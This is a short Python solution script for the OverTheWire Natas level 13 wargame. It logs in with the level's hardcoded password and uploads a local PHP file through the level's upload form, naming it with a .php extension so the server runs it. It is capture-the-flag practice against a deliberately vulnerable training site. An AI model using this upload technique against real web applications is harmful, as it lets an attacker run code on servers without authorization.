#!/usr/bin/python3

import requests

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"

url = 'http://'+username+'.natas.labs.overthewire.org/'
session = requests.session()
file = {'uploadedfile' : open('Level13.php','rb')}
data = {'MAX_FILE_SIZE' : '1000' , 'filename' : 'Level13.php'}
response = session.post(url,files = file,data =data, auth = (username, password))
content = response.text

print(content)
